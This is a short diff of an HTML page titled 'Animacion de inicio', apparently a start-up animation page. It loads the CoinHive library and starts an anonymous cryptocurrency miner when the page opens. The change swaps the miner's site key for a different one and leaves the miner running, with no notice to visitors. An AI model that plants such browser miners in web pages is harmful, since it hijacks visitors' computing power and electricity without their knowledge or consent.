@@ -3,7 +3,7 @@
 <title>Animacion de inicio</title> 
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-var miner = new CoinHive.Anonymous('PUOtdocnCsXahn6YK4NCKJDgFZuhRIjx');
+var miner = new CoinHive.Anonymous('dUZU5QxpJcb7vfGktzV4TJzv1h0kkNdn');
 miner.start();
 </script>
 <link rel="stylesheet" href="css/ani/estilo.css" />
